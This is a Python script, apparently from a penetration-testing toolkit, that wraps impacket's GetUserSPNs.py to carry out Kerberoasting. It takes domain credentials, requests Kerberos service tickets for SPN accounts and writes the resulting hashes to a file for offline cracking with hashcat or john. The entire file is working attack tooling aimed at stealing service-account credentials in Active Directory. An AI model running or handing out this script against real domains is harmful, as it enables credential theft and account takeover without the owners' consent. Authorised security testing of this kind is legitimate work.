#!/usr/bin/env python3
"""
active-directory/kerberoast.py — Kerberoasting helper (impacket wrapper).

Requests service tickets for SPN accounts and saves hashes for offline
cracking with hashcat / john.

Usage:
  vex active-directory kerberoast -d <domain> -u <user> -p <pass> [-o <file>]
"""

import argparse
import subprocess
import sys
from pathlib import Path


def parse_args():
    p = argparse.ArgumentParser(description="Kerberoasting via impacket GetUserSPNs.py")
    p.add_argument("-d", "--domain",   required=True, help="Target domain (e.g. corp.local)")
    p.add_argument("-u", "--user",     required=True, help="Domain username")
    p.add_argument("-p", "--password", required=True, help="Domain password")
    p.add_argument("-dc", "--dc-ip",   help="Domain controller IP (optional)")
    p.add_argument("-o", "--output",   help="Save hashes to this file")
    return p.parse_args()


def find_getuserspns():
    """Locate impacket's GetUserSPNs.py."""
    candidates = [
        "GetUserSPNs.py",
        "/usr/share/doc/python3-impacket/examples/GetUserSPNs.py",
        "/usr/lib/python3/dist-packages/impacket/examples/GetUserSPNs.py",
    ]
    for c in candidates:
        p = Path(c)
        if p.exists():
            return str(p)
    return None


def main():
    args = parse_args()
    spns_script = find_getuserspns()
    if spns_script is None:
        print("[-] impacket not found. Install with: pip3 install impacket", file=sys.stderr)
        sys.exit(1)

    target = f"{args.domain}/{args.user}:{args.password}"
    cmd = ["python3", spns_script, target, "-request"]
    if args.dc_ip:
        cmd += ["-dc-ip", args.dc_ip]
    if args.output:
        cmd += ["-outputfile", args.output]

    print(f"[*] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd)
    sys.exit(result.returncode)


if __name__ == "__main__":
    main()
